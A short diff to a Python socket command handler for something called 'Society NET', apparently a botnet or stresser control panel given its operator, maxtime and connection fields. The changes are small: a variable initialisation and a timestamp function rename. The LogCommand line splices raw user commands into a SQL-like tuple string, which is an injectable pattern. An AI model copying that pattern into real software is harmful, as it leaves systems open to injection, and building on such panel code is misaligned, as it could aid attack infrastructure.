@@ -38,6 +38,7 @@ def CMDHandler(socket, addr):
         Strings.CurrentMtime = ServerUtils.GetCurrentMaxtime(socket)
         Strings.CurrentConn = ServerUtils.GetCurrentConn(socket)
         Strings.CurrentAdmin = ServerUtils.GetCurrentAdmin(socket)
+    data = ""
     try:
         CLI_Control.set_Title(socket, f"Society NET | Operator: {Strings.CurrentUser} | Online Users: {len(ServerConfig.clients)}")
         # Request for user input 
@@ -50,7 +51,7 @@ def CMDHandler(socket, addr):
     # data = str(socket.recv(buffer_length).decode()).strip().replace("\r\n", "")
 
     if data != "":
-        print(f"Username: {Strings.CurrentUser} | CMD: " + data + " | Time: " + str(utils.CurrentTime()) + "\n") # Debugging / Removing this later
+        print(f"Username: {Strings.CurrentUser} | CMD: " + data + " | Time: " + str(utils.CurrentDateTime()) + "\n") # Debugging / Removing this later
 
 
         if data.lower() == "dashboard":
@@ -101,5 +102,5 @@ def CMDHandler(socket, addr):
 
         socket.send(str(f"\x1b[34m╔═[{Strings.CurrentUser}@Society]\r\n\x1b[34m╚════\x1b[31m➢ ").encode())
 
-        LogTypes.LogCommand(f"('{Strings.CurrentUser}','{data}','{str(utils.CurrentTime())}')")
+        LogTypes.LogCommand(f"('{Strings.CurrentUser}','{data}','{str(utils.CurrentDateTime())}')")
         Discord.send_logs(f"[NEW COMMAND]\r\n[User]: {Strings.CurrentUser} | [IP]: {Strings.CurrentIP}\r\n[COMMAND]: {data}")
